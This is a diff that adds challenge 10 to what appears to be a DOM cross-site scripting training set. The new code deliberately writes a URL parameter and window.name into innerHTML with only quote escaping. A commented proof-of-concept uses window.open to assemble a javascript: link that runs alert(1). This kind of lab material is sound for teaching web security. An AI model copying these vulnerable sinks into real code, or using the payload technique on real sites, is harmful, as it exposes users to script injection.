@@ -65,3 +65,36 @@ let hashValueToUse = hash1.length > 1 ? unescape(hash1.substr(1)) : hash1;
 hashValueToUse = hashValueToUse.replace(/</g, "&lt;").replace(/>/g, "&gt;");
 let msg1 = "<a href='#user=" + hashValueToUse + "'>Welcome</a>!!";
 document.getElementById("msgboard").innerHTML = msg1;
+
+// 10
+/* 
+<script>
+var victim= window.open('https://domgo.at/cxss/example/10?lang=en&user=ID-javascript', ':alert(1)');
+</script>
+*/
+let urlParts = location.href.split("?");
+if (urlParts.length > 1) {
+    
+    let queryString = urlParts[1];
+    let queryParts = queryString.split("&");
+    let userId = "";
+    for (let i = 0; i < queryParts.length; i++) {
+        
+        let keyVal = queryParts[i].split("=");
+        if (keyVal.length > 1) {
+            if (keyVal[0] === "user") {
+                
+                userId = keyVal[1];
+                break;
+            }
+        }
+    }
+    if (userId.startsWith("ID-")) {
+
+        userId = userId.substr(3, 10);
+        userId = userId.replace(/"/g, "&quot;");
+        let windowValueToUse = window.name.replace(/"/g, "&quot;");
+        let msg = "<a href=\"" + userId + windowValueToUse + "\">Welcome</a>!!";
+        document.getElementById("msgboard").innerHTML = msg;
+    }
+}
